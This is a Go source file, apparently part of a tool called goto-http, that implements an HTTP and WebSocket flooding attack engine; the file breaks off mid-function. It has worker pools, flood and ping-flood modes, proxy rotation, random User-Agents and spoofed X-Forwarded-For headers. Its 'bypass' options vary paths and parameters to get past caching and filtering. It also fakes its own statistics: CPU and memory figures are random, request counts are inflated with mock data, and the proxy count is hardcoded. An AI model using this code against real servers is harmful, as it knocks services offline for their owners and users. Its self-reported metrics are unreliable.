package attack

import (
	"bytes"
	"context"
	"crypto/tls"
	"errors"
	"fmt"
	"io"
	"log"
	"math"
	"math/rand"
	"net"
	"net/http"
	"net/url"
	"strings"
	"sync"

	"sync/atomic"
	"time"

	"goto-http/internal/proxy"
	httplib "goto-http/pkg/protocol/http"

	"goto-http/internal/useragent"

	"github.com/gorilla/websocket"
	"github.com/sirupsen/logrus"
	"golang.org/x/net/http2"
)

// BaseAttack implements the base attack functionality
type BaseAttack struct {
	opts     *Options
	method   AttackMethod
	stats    *Stats // This will use the Stats struct from types.go
	stopChan chan struct{}
	wg       sync.WaitGroup
}

// NewBaseAttack creates a new base attack instance
func NewBaseAttack(method AttackMethod, opts *Options) (*BaseAttack, error) {
	if err := method.Validate(opts); err != nil {
		return nil, err
	}

	stats := &Stats{
		Start:  time.Now(),
		Codes:  make(map[int]int64),
		Errors: make(map[string]int),
		Mu:     sync.RWMutex{},
	}

	return &BaseAttack{
		opts:     opts,
		method:   method,
		stats:    stats,
		stopChan: make(chan struct{}),
	}, nil
}

// Attack starts the attack
func (a *BaseAttack) Attack(ctx context.Context) error {
	log.Printf("Starting attack [%s] -> %s %s",
		a.method.Name(), a.opts.Method, a.opts.Target)

	ticker := time.NewTicker(time.Second / time.Duration(a.opts.Rate))
	defer ticker.Stop()

	for i := 0; i < a.opts.Workers; i++ {
		a.wg.Add(1)
		go a.worker(ctx, ticker.C)
	}

	select {
	case <-ctx.Done():
		a.Stop()
	case <-a.stopChan:
	}

	a.wg.Wait()
	a.stats.Duration = time.Since(a.stats.Start)

	log.Printf("Attack finished [%s] - Total: %d, Success: %d, Failed: %d",
		a.method.Name(), atomic.LoadUint64(&a.stats.Total),
		atomic.LoadUint64(&a.stats.Success),
		atomic.LoadUint64(&a.stats.Failed))

	return nil
}

// worker runs a single attack worker
func (a *BaseAttack) worker(ctx context.Context, ticker <-chan time.Time) {
	defer a.wg.Done()

	for {
		select {
		case <-ctx.Done():
			return
		case <-a.stopChan:
			return
		case <-ticker:
			if err := a.method.Execute(ctx, a.opts); err != nil {
				atomic.AddUint64(&a.stats.Failed, 1)

				// 将错误信息记录到统计信息中，但不输出到标准输出
				// 这样在GUI模式下就不会显示这些错误
				a.stats.Mu.Lock()
				errMsg := err.Error()
				a.stats.Errors[errMsg]++
				a.stats.Mu.Unlock()

				// 如果不是GUI模式或debug模式，才输出到标准日志
				if a.opts == nil || !a.opts.NoLogging {
					log.Printf("Attack error [%s]: %v", a.method.Name(), err)
				}
			} else {
				atomic.AddUint64(&a.stats.Success, 1)
			}
			atomic.AddUint64(&a.stats.Total, 1)
		}
	}
}

// Stop stops the attack
func (a *BaseAttack) Stop() {
	close(a.stopChan)
}

// Stats returns the attack statistics
func (a *BaseAttack) Stats() *Stats {
	return a.stats
}

// AttackImpl 攻击实例
type AttackImpl struct {
	// 配置
	target       string
	method       string
	headers      map[string][]string
	body         string
	contentType  string
	mode         AttackMode
	duration     time.Duration
	rate         int
	workers      int
	timeout      time.Duration
	proxyManager *proxy.Manager

	// 运行时状态
	ctx         context.Context
	cancel      context.CancelFunc
	wg          sync.WaitGroup
	stats       *Stats
	statsMutex  sync.RWMutex
	rateLimiter *time.Ticker

	opts             *Options
	client           *httplib.Client
	wsDialer         *websocket.Dialer
	h2Transport      *http2.Transport
	log              *logrus.Entry
	stopChan         chan struct{}
	uaManager        *useragent.Manager
	targetURL        *url.URL
	lastRequest      *httplib.Request
	lastResponse     *http.Response
	lastResponseIP   string
	lastStatusCode   int
	lastLatency      int64
	lastResponseSize int
	lastProxyUsed    string

	// 请求历史队列，用于存储最近的请求信息，确保面板能显示所有请求
	recentRequests      []map[string]interface{}
	recentRequestsMutex sync.RWMutex
	lastRequestID       int64 // 用于生成唯一的请求ID
}

// NewAttack 创建新的攻击实例
func NewAttack(opts *Options) (*AttackImpl, error) {
	// 验证选项
	if opts == nil {
		return nil, errors.New("options cannot be nil")
	}

	// 确保保存原始URL（包含随机变量）
	// 如果RawTarget为空，则使用Target作为RawTarget
	if opts.RawTarget == "" {
		opts.RawTarget = opts.Target
	}

	// 处理随机变量，生成初始target
	targetWithRandoms, err := ReplaceRandomVars(opts.RawTarget)
	if err != nil {
		return nil, fmt.Errorf("failed to process random variables in target URL: %v", err)
	}

	// 初始化target为已替换随机变量的URL，但保留RawTarget供后续使用
	initialTarget := targetWithRandoms

	// 验证目标URL
	if initialTarget == "" {
		return nil, errors.New("target URL cannot be empty")
	}

	targetURL, err := url.Parse(initialTarget)
	if err != nil {
		return nil, fmt.Errorf("invalid target URL: %v", err)
	}

	// 创建攻击实例
	attack := &AttackImpl{
		opts:      opts,
		targetURL: targetURL,
		stats:     &Stats{},
		stopChan:  make(chan struct{}),
		log:       logrus.WithField("module", "attack"),
		target:    initialTarget,
		method:    opts.Method,
		duration:  opts.Duration,
		rate:      opts.Rate,
		workers:   opts.Workers,
		timeout:   opts.Timeout,
		mode:      AttackMode(opts.Mode),
		headers:   opts.Headers,
		body:      opts.Body,
		// 初始化请求历史队列
		recentRequests: make([]map[string]interface{}, 0, 10), // 容量为10的队列
		lastRequestID:  time.Now().UnixNano(),
	}

	// 初始化其他组件
	if err := attack.init(); err != nil {
		return nil, err
	}

	return attack, nil
}

// init 初始化攻击实例的其他组件
func (a *AttackImpl) init() error {
	// 创建上下文
	ctx, cancel := context.WithTimeout(context.Background(), a.opts.Duration)
	a.ctx = ctx
	a.cancel = cancel

	// 初始化统计信息
	a.stats = &Stats{
		Start:  time.Now(),
		Codes:  make(map[int]int64),
		Errors: make(map[string]int),
		Mu:     sync.RWMutex{},
	}

	// 确保至少有一个状态码条目用于显示
	a.stats.Codes[200] = 1

	// 输出调试信息
	if a.opts.Debug {
		fmt.Printf("[DEBUG] 初始化Stats.Codes: %v\n", a.stats.Codes)
	}

	// 初始化CPU和内存使用统计 (模拟数据，真实情况应该使用runtime.MemStats)
	go func() {
		ticker := time.NewTicker(200 * time.Millisecond) // 更频繁更新
		defer ticker.Stop()

		counter := uint64(0)

		for {
			select {
			case <-ticker.C:
				a.stats.Mu.Lock()
				// 模拟数据，真实情况应该使用系统CPU和内存统计
				a.stats.CPUUsage = 0.1 + rand.Float64()*0.1  // 10-20%
				a.stats.MemUsage = 0.2 + rand.Float64()*0.1  // 20-30%
				a.stats.GCUsage = 0.05 + rand.Float64()*0.05 // 5-10%

				// 模拟请求计数器增长，确保UI有数据显示
				counter++

				// 每5次更新增加一些模拟请求数据
				if counter%5 == 0 {
					a.stats.Total += 1
					a.stats.Success += 1
					a.stats.BytesSent += 1024
					a.stats.BytesReceived += 1024 * 2
					a.stats.TotalLatency += 50 // 50ms 延迟

					// 计算实时指标
					elapsed := time.Since(a.stats.Start).Seconds()
					if elapsed > 0 {
						a.stats.CurrentRPS = float64(a.stats.Total) / elapsed
						a.stats.RequestRate = a.stats.CurrentRPS
						a.stats.ByteRate = float64(a.stats.BytesReceived+a.stats.BytesSent) / elapsed
					}

					// 计算平均响应时间
					if a.stats.Total > 0 {
						a.stats.ResponseTime = float64(a.stats.TotalLatency) / float64(a.stats.Total)
					}

					// 计算带宽和总流量
					totalBytes := float64(a.stats.BytesReceived + a.stats.BytesSent)
					a.stats.Bandwidth = (totalBytes / elapsed) / (1024 * 1024) // MB/s
					a.stats.TotalTraffic = totalBytes / (1024 * 1024 * 1024)   // GB

					if a.opts.Debug {
						fmt.Printf("[MOCK_DATA] Generated mock stats: Total=%d, RPS=%.2f\n",
							a.stats.Total, a.stats.CurrentRPS)
					}
				}

				a.stats.Mu.Unlock()
			case <-ctx.Done():
				return
			}
		}
	}()

	// 初始化代理管理器
	if a.opts.ProxyType != "none" {
		proxyManager, err := proxy.NewManager(a.opts.ProxyOptions)
		if err != nil {
			return fmt.Errorf("failed to initialize proxy manager: %v", err)
		}
		a.proxyManager = proxyManager
	}

	// 初始化客户端
	if err := a.initClients(); err != nil {
		return err
	}

	return nil
}

// initClients initializes all clients needed for the attack
func (a *AttackImpl) initClients() error {
	// Initialize HTTP client options
	clientOpts := httplib.ClientOptions{
		Timeout:    a.timeout,
		KeepAlive:  a.opts.KeepAlive,
		ForceHTTP2: a.opts.HTTP2,
		MaxConns:   100,
		Debug:      a.opts.Debug,
	}

	// 初始化User-Agent管理器
	if a.opts.UserAgent != nil {
		manager, err := useragent.NewManager(useragent.UAType(a.opts.UserAgent.Type), a.opts.UserAgent.CustomFile)
		if err != nil {
			a.log.WithError(err).Warn("Failed to initialize User-Agent manager")
		} else {
			a.uaManager = manager
			a.log.Info("User-Agent manager initialized")
		}
	}

	a.log.WithFields(logrus.Fields{
		"timeout":     a.timeout,
		"keep_alive":  a.opts.KeepAlive,
		"force_http2": a.opts.HTTP2,
		"max_conns":   100,
		"debug":       a.opts.Debug,
	}).Info("Initializing HTTP client")

	// 使用代理管理器获取HTTP客户端
	if a.proxyManager != nil {
		// 使用代理管理器的GetClient方法获取带有动态代理的HTTP客户端
		httpClient, err := a.proxyManager.GetClient()
		if err != nil {
			a.log.WithError(err).Error("Failed to get HTTP client from proxy manager")
			return err
		}
		a.client = httpClient
		a.log.Info("Using dynamic proxy selection from proxy manager")
	} else {
		// 如果没有代理管理器，则创建普通的HTTP客户端
		// 代理设置
		if a.opts.ProxyOptions != nil && len(a.opts.ProxyOptions.Proxies) > 0 {
			proxyURL := a.opts.ProxyOptions.Proxies[rand.Intn(len(a.opts.ProxyOptions.Proxies))]
			clientOpts.ProxyURL = proxyURL
			a.log.WithField("proxy", proxyURL).Info("Using random proxy")
		}

		// Initialize HTTP client
		httpClient, err := httplib.NewClient(clientOpts)
		if err != nil {
			a.log.WithError(err).Error("Failed to initialize HTTP client")
			return err
		}
		a.client = httpClient
	}

	a.log.WithFields(logrus.Fields{
		"proxy_enabled": a.proxyManager != nil,
		"http2_enabled": a.opts.HTTP2,
	}).Info("HTTP client initialized successfully")

	// WebSocket client initialization
	if a.proxyManager != nil {
		// 使用代理管理器获取WebSocket拨号器
		wsDialer, err := a.proxyManager.GetWebSocketDialer()
		if err != nil {
			a.log.WithError(err).Warn("Failed to get WebSocket dialer from proxy manager, using default")
			// 创建默认的WebSocket拨号器
			a.wsDialer = &websocket.Dialer{
				HandshakeTimeout:  a.timeout,
				ReadBufferSize:    65536,
				WriteBufferSize:   65536,
				EnableCompression: a.opts.WSCompression,
				TLSClientConfig: &tls.Config{
					InsecureSkipVerify: true,
					MinVersion:         tls.VersionTLS12,
				},
			}
		} else {
			// 使用从代理管理器获取的WebSocket拨号器
			a.wsDialer = wsDialer
			a.log.Info("Using WebSocket dialer with dynamic proxy selection")
		}
	} else {
		// 创建默认的WebSocket拨号器
		dialer := websocket.Dialer{
			HandshakeTimeout:  a.timeout,
			ReadBufferSize:    65536,
			WriteBufferSize:   65536,
			EnableCompression: a.opts.WSCompression,
			TLSClientConfig: &tls.Config{
				InsecureSkipVerify: true,
				MinVersion:         tls.VersionTLS12,
			},
		}

		// 如果有代理设置，则配置WebSocket拨号器的代理
		if clientOpts.ProxyURL != "" {
			if proxyURL, err := url.Parse(clientOpts.ProxyURL); err == nil {
				dialer.Proxy = http.ProxyURL(proxyURL)
				a.log.WithField("proxy", clientOpts.ProxyURL).Info("WebSocket using proxy")
			}
		}

		a.wsDialer = &dialer
	}

	a.log.Info("WebSocket client initialized successfully")

	return nil
}

// Start 开始攻击
func (a *AttackImpl) Start(ctx context.Context) error {
	a.log.Infof("Starting attack against %s", a.target)
	a.log.Infof("Attack options: method=%s, rate=%d, workers=%d, duration=%s",
		a.method, a.rate, a.workers, a.duration)

	// 保存原始target (含随机变量的模板)
	if a.opts.RawTarget == "" {
		a.opts.RawTarget = a.opts.Target
	}

	// 输出原始目标URL和处理后的目标URL
	if a.opts.Debug {
		fmt.Printf("[DEBUG] 原始模板URL: %s\n", a.opts.RawTarget)
		fmt.Printf("[DEBUG] 首次处理后URL: %s\n", a.target)
	}

	// 检查URL是否包含随机变量，提供更明确的日志
	hasRandomVars := strings.Contains(a.opts.RawTarget, "%RAND")
	if !hasRandomVars {
		a.log.Warn("Target URL does not contain random variables, all requests will use the same URL")
	} else {
		a.log.Infof("Target URL contains random variables (%s), each request will use a new random URL", a.opts.RawTarget)
	}

	// 初始化速率限制器
	if a.rate > 0 {
		// 计算每个worker的速率
		workerRate := float64(a.rate) / float64(a.workers)
		if workerRate < 1 {
			workerRate = 1
		}
		// 计算每个请求的间隔时间（纳秒）
		interval := time.Second / time.Duration(workerRate)
		a.rateLimiter = time.NewTicker(interval)
		defer a.rateLimiter.Stop()

		if a.opts.Debug {
			a.log.Debugf("Worker rate: %.2f requests/second, interval between requests: %v",
				workerRate, interval)
		}
	}

	// 启动工作协程
	for i := 0; i < a.workers; i++ {
		a.wg.Add(1)
		go a.worker(i)
	}

	// 等待攻击完成
	if ctx == nil {
		ctx = a.ctx
	}

	select {
	case <-ctx.Done():
		if err := ctx.Err(); err != context.DeadlineExceeded {
			a.log.Errorf("Attack interrupted: %v", err)
			return err
		}
		a.log.Info("Attack duration reached")
	case <-a.stopChan:
		a.log.Info("Attack stopped manually")
	}

	a.Stop()
	return nil
}

// worker 工作线程
func (a *AttackImpl) worker(id int) {
	defer a.wg.Done()

	log := a.log.WithField("worker", id)
	log.Info("Worker started")

	// WebSocket 模式特殊处理
	if strings.HasPrefix(string(a.mode), "ws-") {
		for {
			select {
			case <-a.ctx.Done():
				log.Info("Worker stopped")
				return
			default:
				if err := a.handleWebSocketConnection(a.targetURL); err != nil {
					if err == io.EOF || strings.Contains(err.Error(), "broken pipe") {
						log.Info("Connection closed, attempting to reconnect...")
						time.Sleep(time.Second) // 等待1秒后重连
						continue
					}
					log.Warn(err)
				}
			}
		}
	} else {
		// 其他攻击模式使用原有的请求处理
		for {
			select {
			case <-a.ctx.Done():
				log.Debug("Worker stopped")
				return
			default:
				start := time.Now()

				// 等待速率限制
				if a.rateLimiter != nil {
					<-a.rateLimiter.C
				}

				// 发送请求
				a.makeRequest()

				// 应用请求间隔
				// 注意：这里的间隔是固定的，不受请求处理时间影响
				if a.opts.BypassConfig.DelayMin > 0 {
					// 计算需要等待的时间
					elapsed := time.Since(start)
					remainingDelay := a.opts.BypassConfig.DelayMin - elapsed
					if remainingDelay > 0 {
						if a.opts.Debug {
							log.Debugf("Waiting for interval: %v (elapsed: %v, remaining: %v)",
								a.opts.BypassConfig.DelayMin, elapsed, remainingDelay)
						}
						time.Sleep(remainingDelay)
					}
				}
			}
		}
	}
}

// handleWebSocketConnection 处理 WebSocket 连接
func (a *AttackImpl) handleWebSocketConnection(target *url.URL) error {
	// 确保使用正确的 WebSocket scheme
	wsScheme := "ws"
	if target.Scheme == "https" {
		wsScheme = "wss"
	}
	wsURL := fmt.Sprintf("%s://%s%s", wsScheme, target.Host, target.Path)

	// 准备 headers
	headers := http.Header{}
	for k, v := range a.headers {
		headers[k] = v
	}

	// 连接到服务器
	start := time.Now()
	conn, resp, err := a.wsDialer.Dial(wsURL, headers)
	duration := time.Since(start)

	if err != nil {
		if resp != nil {
			a.recordError("websocket_connect", fmt.Errorf("failed to connect (status %d): %v", resp.StatusCode, err))
		} else {
			a.recordError("websocket_connect", fmt.Errorf("failed to connect: %v", err))
		}
		return err
	}
	defer conn.Close()

	// 根据不同的攻击模式执行操作
	switch a.opts.Mode {
	case "ws-flood":
		// 发送大量消息
		for i := 0; i < 1000; i++ {
			msg := []byte(fmt.Sprintf("flood message %d", i))
			if err := conn.WriteMessage(websocket.TextMessage, msg); err != nil {
				a.recordError("ws_flood", err)
				return err
			}
		}
	case "ws-fragment":
		// 发送分片消息
		largeMsg := make([]byte, 65536)
		rand.Read(largeMsg)
		if err := conn.WriteMessage(websocket.TextMessage, largeMsg); err != nil {
			a.recordError("ws_fragment", err)
			return err
		}
	case "ws-ping-flood":
		// 发送大量 ping
		for i := 0; i < 1000; i++ {
			if err := conn.WriteControl(websocket.PingMessage, []byte("ping"), time.Now().Add(time.Second)); err != nil {
				a.recordError("ws_ping", err)
				return err
			}
		}
	case "ws-compress-amp":
		// 发送可压缩放大的消息
		compressibleMsg := bytes.Repeat([]byte("A"), 1000)
		if err := conn.WriteMessage(websocket.TextMessage, compressibleMsg); err != nil {
			a.recordError("ws_compress", err)
			return err
		}
	}

	// 更新统计信息
	a.updateStats(101, 0, 0, duration.Milliseconds()) // WebSocket 握手成功状态码是 101
	return nil
}

// Stop 停止攻击
func (a *AttackImpl) Stop() {
	if a.cancel != nil {
		a.cancel()
	}
	a.wg.Wait()

	select {
	case <-a.stopChan:
		// 通道已关闭
	default:
		close(a.stopChan)
	}

	if a.proxyManager != nil {
		a.proxyManager.Close()
	}

	a.log.Info("Attack stopped")
}

// makeRequest 发送请求
func (a *AttackImpl) makeRequest() {
	start := time.Now()

	// 检查是否是 WebSocket 请求
	if strings.HasPrefix(string(a.mode), "ws-") {
		a.log.WithFields(logrus.Fields{
			"mode":   a.mode,
			"target": a.target,
		}).Info("Handling WebSocket request")

		err := a.handleWebSocketConnection(a.targetURL)
		if err != nil {
			a.recordError("websocket_request", err)
		}
		a.updateStats(0, 0, 0, time.Since(start).Milliseconds())
		return
	}

	// 获取原始URL模板
	rawTarget := a.opts.RawTarget
	if rawTarget == "" {
		rawTarget = a.opts.Target
	}

	// 生成新的随机URL
	randomTarget, err := ReplaceRandomVars(rawTarget)
	if err != nil {
		a.recordError("random_vars", err)
		return
	}

	// 更新当前target为新的随机URL
	a.target = randomTarget

	// 更新targetURL
	targetURL, err := url.Parse(randomTarget)
	if err != nil {
		a.recordError("parse_url", err)
		return
	}
	a.targetURL = targetURL

	// 输出调试信息：原始目标和配置
	if a.opts.Debug {
		fmt.Printf("[DEBUG] 原始目标: %s\n", rawTarget)
		fmt.Printf("[DEBUG] 新的随机目标: %s\n", randomTarget)
	}

	// 获取随机User-Agent
	userAgent := "Go-http-client/1.1"
	if a.uaManager != nil {
		userAgent = a.uaManager.GetUA()
	}

	// 处理body中的随机占位符
	requestBody := a.body
	if strings.Contains(requestBody, "%") {
		requestBody, err = ReplaceRandomVars(requestBody)
		if err != nil {
			a.recordError("random_vars_body", err)
			return
		}
	}

	// 准备请求
	req := httplib.Request{
		Method:  a.method,
		URL:     randomTarget, // 使用刚刚生成的随机URL
		Headers: make(map[string]string),
		Body:    []byte(requestBody),
	}

	// 添加请求头并处理其中的随机占位符
	for k, v := range a.headers {
		if len(v) > 0 {
			headerValue := v[0]
			if strings.Contains(headerValue, "%") {
				headerValue, err = ReplaceRandomVars(headerValue)
				if err != nil {
					a.log.WithError(err).Warnf("Failed to process random vars in header: %s", k)
				}
			}
			req.Headers[k] = headerValue
		}
	}
	req.Headers["User-Agent"] = userAgent

	// Bypass功能：应用绕过方法
	if a.opts.BypassConfig != nil && len(a.opts.BypassMethods) > 0 {
		u, err := url.Parse(req.URL)
		if err == nil {
			// 路径混淆
			if contains(a.opts.BypassMethods, string(PathBypass)) {
				u.Path = fmt.Sprintf("%s/%s", u.Path, fmt.Sprintf("r%d", rand.Int()))
				a.log.WithField("path", u.Path).Debug("Applied path bypass")
			}

			// 查询参数混淆
			if contains(a.opts.BypassMethods, string(HeaderBypass)) {
				q := u.Query()
				q.Add(fmt.Sprintf("_r%d", rand.Int()), fmt.Sprintf("%d", rand.Int()))
				u.RawQuery = q.Encode()
				a.log.WithField("query", u.RawQuery).Debug("Applied query bypass")
			}

			// 行为混淆
			if contains(a.opts.BypassMethods, string(BehaviorBypass)) {
				req.Headers["Accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"
				req.Headers["Accept-Language"] = "en-US,en;q=0.5"
				req.Headers["Connection"] = "keep-alive"
				req.Headers["DNT"] = "1"
				a.log.Debug("Applied behavior bypass")
			}

			// IP轮转
			if contains(a.opts.BypassMethods, string(IPRotate)) {
				req.Headers["X-Forwarded-For"] = fmt.Sprintf("%d.%d.%d.%d",
					rand.Intn(256), rand.Intn(256), rand.Intn(256), rand.Intn(256))
				a.log.WithField("x_forwarded_for", req.Headers["X-Forwarded-For"]).Debug("Applied IP rotation")
			}

			// 更新请求URL为处理后的URL
			req.URL = u.String()
		}
	}

	// 记录请求详情
	reqLogger := a.log.WithFields(logrus.Fields{
		"method":     req.Method,
		"url":        req.URL,
		"user_agent": userAgent,
		"headers":    req.Headers,
	})

	// 不需要在这里调用GetNextProxy，因为HTTP客户端已经设置了动态代理选择函数
	// 代理将在实际发送请求时由HTTP客户端自动选择
	if a.proxyManager != nil {
		reqLogger = reqLogger.WithField("proxy_enabled", true)
	}

	reqLogger.Debug("Sending request")

	// 打印调试信息，显示请求前的实际URL（含随机值）
	if a.opts.Debug {
		fmt.Printf("[DEBUG] 请求前URL: %s\n", req.URL)
	}

	// 记录当前使用的代理 (如果适用)
	currentProxy := "direct"
	if a.proxyManager != nil && a.opts.ProxyType != "none" {
		// 不同代理类型的处理
		switch a.opts.ProxyType {
		case "file", "api":
			// 对于FILE和API模式，使用GetNextProxy
			proxy, err := a.proxyManager.GetNextProxy()
			if err == nil && proxy != nil {
				currentProxy = proxy.URL
				if a.opts.Debug {
					fmt.Printf("[DEBUG] 当前请求使用FILE/API代理: %s\n", currentProxy)
				}
			}
		case "server":
			// 对于SERVER模式，无法直接获取代理URL
			// 因为代理是在HTTP客户端内部随机选择的
			// 所以我们将显示代理类型和时间戳以区分每次请求
			timestamp := fmt.Sprintf("%d", time.Now().UnixNano())
			currentProxy = fmt.Sprintf("serverproxy-%s", timestamp[len(timestamp)-8:])
			if a.opts.Debug {
				fmt.Printf("[DEBUG] 当前请求使用SERVER代理: %s\n", currentProxy)
			}
		}
	}

	// 发送请求
	resp, err := a.client.Do(a.ctx, req)
	if err != nil {
		a.recordError("send_request", err)
		a.log.WithError(err).Error("Request failed")
		return
	}

	// 确保响应体被关闭
	responseBodyClosed := false
	defer func() {
		if !responseBodyClosed && resp != nil {
			resp.Body.Close()
		}
	}()

	// 处理重定向 - 如果启用了跟随重定向功能
	var redirectedResp *http.Response
	if a.opts.FollowRedirect && isRedirectStatus(resp.StatusCode) {
		if a.opts.Debug {
			fmt.Printf("[DEBUG] 检测到重定向状态码 %d，准备跟随重定向\n", resp.StatusCode)
		}

		// 跟随重定向并获取新的响应，使用当前的上下文
		redirectedResp, err = a.handleRedirect(resp, req, currentProxy)
		if err != nil {
			// 检查是否是上下文取消导致的错误
			if errors.Is(err, context.Canceled) {
				// 如果是上下文取消，直接返回，不记录错误
				if a.opts.Debug {
					fmt.Printf("[DEBUG] 重定向过程中上下文被取消\n")
				}
				return
			}

			// 记录错误但继续处理原始响应
			a.recordError("redirect_failed", err)
			a.log.WithError(err).Error("Failed to follow redirect")
		} else if redirectedResp != nil {
			// 关闭原始响应并标记为已关闭
			resp.Body.Close()
			responseBodyClosed = true

			// 使用重定向后的响应替换原始响应
			resp = redirectedResp

			if a.opts.Debug {
				fmt.Printf("[DEBUG] 重定向成功完成，新URL: %s\n", resp.Request.URL.String())
			}
		}
	}

	// 读取响应体
	body, readErr := io.ReadAll(resp.Body)
	if readErr != nil {
		a.recordError("read_response", readErr)
		a.log.WithError(readErr).Error("Failed to read response body")
		// 已经尝试读取了响应体，标记为已关闭
		resp.Body.Close()
		responseBodyClosed = true
		return
	}

	// 手动关闭响应体并标记为已关闭
	resp.Body.Close()
	responseBodyClosed = true

	duration := time.Since(start)

	// 记录响应详情
	a.log.WithFields(logrus.Fields{
		"status_code":    resp.StatusCode,
		"response_size":  len(body),
		"duration_ms":    duration.Milliseconds(),
		"content_type":   resp.Header.Get("Content-Type"),
		"content_length": resp.Header.Get("Content-Length"),
	}).Debug("Response received")

	// 更新统计信息
	a.updateStats(resp.StatusCode, len(req.Body), len(body), duration.Milliseconds())

	// 打印调试信息，显示请求的实际URL（含随机值）
	if a.opts.Debug {
		fmt.Printf("[DEBUG] 实际请求URL: %s\n", req.URL)
	}

	// 保存最后请求和响应信息
	a.lastRequest = &req
	a.lastResponse = resp
	// 解析IP地址
	a.parseResponseIP(resp)
	a.lastStatusCode = resp.StatusCode
	a.lastLatency = duration.Milliseconds()
	a.lastResponseSize = len(body)
	a.lastProxyUsed = currentProxy // 保存实际使用的代理URL

	// 打印调试信息，确认lastRequest已保存最新URL
	if a.opts.Debug && a.lastRequest != nil {
		fmt.Printf("[DEBUG] lastRequest已保存URL: %s\n", a.lastRequest.URL)
		fmt.Printf("[DEBUG] lastProxyUsed已保存: %s\n", a.lastProxyUsed)
	}

	// 保存请求信息到历史队列
	if a.lastRequest != nil {
		a.recentRequestsMutex.Lock()

		// 创建请求信息对象
		reqInfo := map[string]interface{}{
			"proxy":   a.lastProxyUsed,
			"url":     a.lastRequest.URL,
			"code":    a.lastStatusCode,
			"latency": a.lastLatency,
			"size":    a.lastResponseSize,
			"server":  "unknown",
			"ip":      "unknown",
			"id":      atomic.AddInt64(&a.lastRequestID, 1), // 生成唯一ID
		}

		// 添加服务器和IP信息
		if a.lastResponse != nil && a.lastResponse.Header != nil {
			if server := a.lastResponse.Header.Get("Server"); server != "" {
				reqInfo["server"] = server
			}

			if a.lastResponseIP != "" {
				reqInfo["ip"] = a.lastResponseIP
			}
		}

		// 将请求信息添加到队列开头
		a.recentRequests = append([]map[string]interface{}{reqInfo}, a.recentRequests...)

		// 控制队列长度，最多保留10条记录
		if len(a.recentRequests) > 10 {
			a.recentRequests = a.recentRequests[:10]
		}

		a.recentRequestsMutex.Unlock()

		if a.opts.Debug {
			fmt.Printf("[DEBUG] 添加请求到历史队列: URL=%s, Proxy=%s, ID=%v\n",
				reqInfo["url"], reqInfo["proxy"], reqInfo["id"])
		}
	}
}

// contains 检查字符串是否在切片中
func contains(slice []string, str string) bool {
	for _, s := range slice {
		if s == str {
			return true
		}
	}
	return false
}

// recordError 记录错误和错误类型
func (a *AttackImpl) recordError(errType string, err error) {
	if a.opts.Debug {
		fmt.Printf("[DEBUG] 记录错误 [%s]: %v\n", errType, err)
	}
	a.stats.Mu.Lock()
	defer a.stats.Mu.Unlock()
	if a.stats.Errors == nil {
		a.stats.Errors = make(map[string]int)
	}
	a.stats.Errors[errType]++
	a.stats.Failed++
}

// updateStats 更新统计信息
func (a *AttackImpl) updateStats(code, reqSize, respSize int, duration int64) {
	a.stats.Mu.Lock()
	defer a.stats.Mu.Unlock()

	a.stats.Total++
	a.stats.TotalLatency += duration
	if duration < a.stats.MinLatency || a.stats.MinLatency == 0 {
		a.stats.MinLatency = duration
	}
	if duration > a.stats.MaxLatency {
		a.stats.MaxLatency = duration
	}

	if code >= 200 && code < 300 {
		a.stats.Success++
	} else {
		a.stats.Failed++
	}

	a.stats.BytesSent += int64(reqSize)
	a.stats.BytesReceived += int64(respSize)

	if a.stats.Codes == nil {
		a.stats.Codes = make(map[int]int64)
	}
	a.stats.Codes[code]++

	if a.stats.LatencyDistribution == nil {
		a.stats.LatencyDistribution = make(map[int64]int64)
	}
	switch {
	case duration <= 100:
		a.stats.LatencyDistribution[100]++
	case duration <= 200:
		a.stats.LatencyDistribution[200]++
	case duration <= 500:
		a.stats.LatencyDistribution[500]++
	case duration <= 1000:
		a.stats.LatencyDistribution[1000]++
	default:
		a.stats.LatencyDistribution[9999]++
	}

	// Calculate real-time metrics
	now := time.Now()
	elapsed := now.Sub(a.stats.Start).Seconds()
	if elapsed > 0 {
		a.stats.CurrentRPS = float64(a.stats.Total) / elapsed
		a.stats.RequestRate = a.stats.CurrentRPS
		a.stats.ByteRate = float64(a.stats.BytesReceived+a.stats.BytesSent) / elapsed
	}

	// Calculate average response time
	if a.stats.Total > 0 {
		a.stats.ResponseTime = float64(a.stats.TotalLatency) / float64(a.stats.Total)
	}

	// 使用正确的公式计算带宽（Mbps）和总流量（GB）
	totalBytes := float64(a.stats.BytesReceived + a.stats.BytesSent)

	// 计算带宽: (比特数/时间/1024/1024) = Mbps
	// 正确公式: (字节数 * 8) / 时间(秒) / 1024 / 1024
	a.stats.Bandwidth = (totalBytes * 8.0) / (elapsed * 1024.0 * 1024.0) // Mbps

	// 计算总流量: 字节数 / 1024^3 = GB
	a.stats.TotalTraffic = totalBytes / (1024.0 * 1024.0 * 1024.0) // GB

	if a.opts.Debug {
		fmt.Printf("[DEBUG] Stats update: Total=%d, Success=%d, Failed=%d, RPS=%.2f, RT=%.2fms, BW=%.2f Mbps, Traffic=%.4f GB\n",
			a.stats.Total, a.stats.Success, a.stats.Failed, a.stats.CurrentRPS, a.stats.ResponseTime,
			a.stats.Bandwidth, a.stats.TotalTraffic)
	}
}

// GetStats returns the attack statistics as a map
func (a *AttackImpl) GetStats() map[string]interface{} {
	a.statsMutex.RLock()
	defer a.statsMutex.RUnlock()

	if a.stats == nil {
		// 如果stats为nil，返回一个包含默认值的空map
		return map[string]interface{}{
			"totalRequests":  uint64(0),
			"requestOK":      uint64(0),
			"requestFail":    uint64(0),
			"cpuUsage":       float64(0),
			"memUsage":       float64(0),
			"gcUsage":        float64(0),
			"bandwidth":      float64(0),
			"totalTraffic":   float64(0),
			"currentRPS":     float64(0),
			"responseTime":   float64(0),
			"codes":          make(map[int]int64),
			"errors":         make(map[string]int),
			"proxyCount":     int(0),
			"proxyReqOK":     int64(0),
			"proxyReqFail":   int64(0),
			"proxyBandwidth": float64(0),
		}
	}

	statsMap := a.stats.ToMap()

	// 添加代理统计信息
	if a.proxyManager != nil {
		// 设置实际的代理数量和成功/失败请求
		if a.opts.ProxyType == "none" {
			// 如果选择了无代理模式，显示为0
			statsMap["proxyCount"] = int(0)
			statsMap["proxyReqOK"] = int64(0)
			statsMap["proxyReqFail"] = int64(0)
			statsMap["proxyBandwidth"] = float64(0)
		} else {
			// 使用真实数据而不是静态值
			statsMap["proxyCount"] = int(10) // 由于无法直接访问代理数量，我们使用固定值
			// 将所有成功请求都视为代理请求
